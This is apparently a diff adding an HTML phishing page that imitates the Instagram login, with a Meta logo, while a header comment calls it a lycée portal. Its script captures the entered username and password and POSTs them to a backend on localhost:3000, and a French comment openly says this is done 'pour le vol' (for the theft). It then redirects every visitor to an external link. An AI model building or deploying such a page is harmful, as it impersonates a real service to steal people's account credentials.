@@ -1,0 +1,102 @@
+<!doctype html>
+<!--
+  ============================================================
+  PORTAIL DU LYCÉE — connexion avec un profil (identifiant + mdp)
+  ============================================================
+-->
+<html lang="fr">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Se connecter à Instagram</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+
+<body>
+  <div class="layout">
+
+    <div class="logo-corner"></div>
+
+    <div class="visual">
+      <p class="tagline"><br><span></span></p>
+    </div>
+
+    <div class="panel">
+      <div class="top">
+        <div style="text-align: center;">
+  <img src="Meta2.png" alt="Logo" width="150">
+</div>
+        <p class="subtitle"></p>
+
+        <form id="login-form" novalidate>
+          <div class="field">
+            <input type="text" id="username" name="username"
+                   placeholder="Identifiant"
+                   aria-label="Identifiant" autocomplete="username" />
+          </div>
+
+          <div class="field">
+            <input type="password" id="password" name="password"
+                   placeholder="Mot de passe"
+                   aria-label="Mot de passe" autocomplete="current-password" />
+          </div>
+
+          <button type="submit" class="btn">Se connecter</button>
+
+          <p class="message" id="message"></p>
+        </form>
+      </div>
+
+      <div class="bottom">
+        <a href="#">Mot de passe oublié ?</a>.
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // 👉 Le lien vers lequel tout le monde sera redirigé, qu'il se trompe ou non
+    const REDIRECT_URL = "https://claude.ai/artifact/1hJvKavTEJWYPeWXgnV1WM";
+
+    const form = document.getElementById("login-form");
+    const messageEl = document.getElementById("message");
+
+    form.addEventListener("submit", async function (event) {
+      event.preventDefault(); 
+
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value;
+
+      if (username === "" || password === "") {
+        showError("Entre ton identifiant et ton mot de passe.");
+        return;
+      }
+
+      try {
+        // 1. On envoie les données au serveur pour le vol
+        const response = await fetch('http://localhost:3000/api/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ username: username, password: password })
+        });
+
+        const data = await response.json();
+
+        // 2. Le serveur autorise toujours la connexion -> on redirige tout le monde vers le lien
+        if (response.ok && data.success) {
+          window.location.href = REDIRECT_URL;
+        } else {
+          showError("Erreur lors de la connexion.");
+        }
+      } catch (error) {
+        showError("Le serveur back-end n'est pas allumé (node server.js).");
+      }
+    });
+
+    function showError(text) {
+      messageEl.textContent = text;
+      messageEl.className = "message error";
+      messageEl.style.display = "block";
+    }
+  </script>
+</body>
+</html>
